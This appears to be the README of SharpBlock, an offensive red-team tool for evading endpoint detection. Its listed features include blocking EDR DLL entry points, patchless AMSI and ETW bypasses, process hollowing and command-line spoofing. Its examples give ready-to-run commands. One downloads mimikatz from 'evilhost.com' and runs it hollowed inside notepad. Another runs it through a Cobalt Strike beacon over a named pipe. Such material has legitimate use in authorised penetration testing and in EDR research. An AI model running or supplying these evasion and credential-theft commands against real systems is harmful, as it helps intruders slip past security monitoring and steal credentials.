# SharpBlock
A method of bypassing EDR's active projection DLL's by preventing entry point execution.  

## Features

* Blocks EDR DLL entry point execution, which prevents EDR hooks from being placed.
* Patchless AMSI bypass that is undetectable from scanners looking for Amsi.dll code patches at runtime.
* Host process that is replaced with an implant PE that can be loaded from disk, HTTP or named pipe (Cobalt Strike)
* Implanted process is hidden to help evade scanners looking for hollowed processes.
* Command line args are spoofed and implanted after process creation using stealthy EDR detection method.
* Patchless ETW bypass 

```
SharpBlock by @_EthicalChaos_
  DLL Blocking app for child processes x86_64

  -e, --exe=VALUE            Program to execute (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -n, --name=VALUE           Name of DLL to block
  -c, --copyright=VALUE      Copyright string to block
  -p, --product=VALUE        Product string to block
  -d, --description=VALUE    Description string to block
  -s, --spawn=VALUE          Host process to spawn for swapping with the target
                               exe
      --disable-bypass-amsi  Disable AMSI bypassAmsi
      --disable-bypass-cmdline
                             Disable command line bypass
      --disable-bypass-etw   Disable ETW bypass
      --disable-header-patch Disable process hollow detection bypass
  -h, --help                 Display this help
  ```

## Examples

### Launch mimikatz over HTTP using notepad as the host process, blocking SylantStrike's DLL

```
SharpBlock -e http://evilhost.com/mimikatz.bin -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee
```

### Launch mimikatz using Cobalt Strike beacon over named pipe using notepad as the host process, blocking SylantStrike's DLL

```
execute-assembly SharpBlock.exe -e \\.\pipe\mimi -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee
upload_file /home/haxor/mimikatz.exe \\.\pipe\mimi
```
*Note, for the `upload_file` beacon command, load upload.cna into Cobalt Strike's Script Manager*



Accompanying Blog Posts: 
 * https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/
 * https://ethicalchaos.dev/2020/06/14/lets-create-an-edr-and-bypass-it-part-2/
 * https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/
 
